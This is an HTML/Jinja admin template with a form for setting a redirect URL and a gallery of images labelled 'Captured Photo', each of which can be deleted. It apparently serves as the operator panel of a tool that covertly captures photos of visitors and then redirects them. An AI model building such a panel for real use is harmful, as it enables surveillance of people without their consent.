<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Page</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        .container {
            border: 2px solid green;
            padding: 20px;
        }
        .image-list {
            list-style-type: none;
            padding: 0;
        }
        .image-item {
            margin-bottom: 10px;
        }
        .image-item img {
            max-width: 100px;
            display: block;
        }
        .image-item a {
            color: green;
            text-decoration: none;
        }
        .delete-button {
            background-color: red;
            color: white;
            border: none;
            padding: 5px;
            cursor: pointer;
        }
        form {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Page</h1>
        <form action="/set_redirect_url" method="post">
            <label for="redirect_url">Redirect URL:</label>
            <input type="text" id="redirect_url" name="redirect_url" value="{{ redirect_url }}" required>
            <button type="submit">Update</button>
        </form>
        <ul class="image-list">
            {% for image in images %}
                <li class="image-item">
                    <img src="{{ image }}" alt="Captured Photo">
                    <a href="{{ image }}" target="_blank">{{ image.split('/').pop() }}</a>
                    <form action="/delete/{{ image }}" method="post" style="display:inline;">
                        <button type="submit" class="delete-button">Delete</button>
                    </form>
                </li>
            {% endfor %}
        </ul>
    </div>
</body>
</html>
